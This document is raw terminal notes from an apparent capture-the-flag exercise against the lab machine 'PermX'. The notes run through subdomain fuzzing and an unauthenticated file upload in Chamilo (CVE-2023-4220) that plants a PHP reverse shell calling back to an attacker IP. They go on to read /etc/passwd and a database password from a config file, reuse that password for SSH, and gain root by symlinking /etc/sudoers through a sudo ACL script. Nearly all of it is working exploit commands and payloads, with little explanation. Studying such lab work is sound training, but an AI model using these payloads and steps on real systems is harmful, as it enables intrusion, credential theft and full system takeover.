@@ -1,0 +1,185 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.23/ -H "Host: FUZZ.permx.htb" -t 50 --hc 404,302,301
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.23/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000001:   200        586 L    2466 W     36182 Ch    "www"                                               
+000000477:   200        352 L    940 W      19347 Ch    "lms"                                               
+                                            
+
+Total time: 0
+Processed Requests: 19966
+Filtered Requests: 19962
+Requests/sec.: 0
+
+
+http://lms.permx.htb/
+
+Administrator : Davis Miller
+Powered by Chamilo © 2025
+CVE-2023-4220
+https://starlabs.sg/advisories/23/23-4220/
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -F 'bigUploadFile=@shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 
+The file has successfully been uploaded.                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php'
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat revshell.gif.php 
+GIF89a
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'"); ?>
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -F 'bigUploadFile=@revshell.gif.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+The file has successfully been uploaded.                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/revshell.gif.php'
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443                        
+listening on [any] 443 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.10.11.23] 47780
+bash: cannot set terminal process group (1173): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
+
+
+www-data@permx:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@permx:/$ 
+
+www-data@permx:/var/www/chamilo$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+www-data@permx:/var/www/chamilo$ 
+
+
+
+found in linpeas
+
+FTP_USER=gaufrette
+FTP_PASSWORD=gaufrette
+FTP_BASE_DIR=/gaufrette
+MONGO_URI=mongodb://mongodb:27017
+MONGO_DBNAME=gridfs_test
+SFTP_HOST=sftp
+SFTP_PORT=22
+SFTP_USER=gaufrette
+SFTP_PASSWORD=gaufrette
+SFTP_BASE_DIR=gaufrette
+
+$_configuration['db_user'] = 'chamilo';
+/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh mtz@permx.htb      
+The authenticity of host 'permx.htb (10.10.11.23)' can't be established.
+ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'permx.htb' (ED25519) to the list of known hosts.
+mtz@permx.htb's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
+
+...
+
+mtz@permx:~$ 
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+mtz@permx:~$ 
+mtz@permx:~$ cat /opt/acl.sh
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+mtz@permx:~$ 
+
+
+"We see that the script first checks if the number of arguments passed is equal to 3; if not, it
+displays a usage message and exits. If all three arguments are passed, the script checks whether
+the target file is within the /home/mtz/ directory and does not contain any ".." in its path, which
+helps to prevent directory traversal. If the target file fails this check, it denies access. Finally, the
+script uses setfacl to modify the file's Access Control List ACL , allowing the specified user to
+have the defined permission on the target file. This command is executed with elevated privileges
+due to the use of sudo .
+In summary, the script modifies the Access Control List ACL of a specified file within the
+/home/mtz/ directory, allowing a designated user to have specific permissions (such as read or
+write) on that file. We can leverage this to get a shell as root by first creating a symbolic link using
+the command below, which uses ln with the -s flag. This creates a symbolic link named root in
+the mtz home directory that points to the /etc/sudoers file."
+
+
+
+"Then, we proceed to use the acl.sh script to grant read and write permissions to the linked file.
+By executing the script with the command below, we specify our user mtz , the permissions rw ,
+and the target file, which is the symbolic link we just created.
+Next, we append a line to the /etc/sudoers file via the symbolic link to allow the mtz user to
+execute any command as root without a password using the following command.
+Finally, we can get a shell as root by running sudo bash , which will provide us with elevated
+privileges, allowing us to execute any command as the root user.
+We can now proceed to grab the root flag.
+mtz@permx:~$ ln -s /etc/sudoers root
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
+mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
